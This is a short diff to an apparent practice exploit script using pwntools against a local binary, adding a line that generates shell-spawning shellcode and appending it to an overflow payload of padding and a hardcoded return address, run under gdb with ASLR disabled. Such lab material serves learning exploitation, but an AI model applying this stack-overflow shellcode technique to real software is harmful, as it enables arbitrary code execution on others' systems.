@@ -32,6 +32,7 @@ p = pwn.gdb.debug("./hello", aslr=False)
 target = 0x7ffffffd548 + 8                       # rsp from gdb, +8 = where shellcode will sit
 
 # 3) build it
+shellcode = pwn.asm(pwn.shellcraft.sh())
 payload  = b"A" * offset
 payload += pwn.p64(target)
 payload += shellcode                             # your raw shellcode bytes
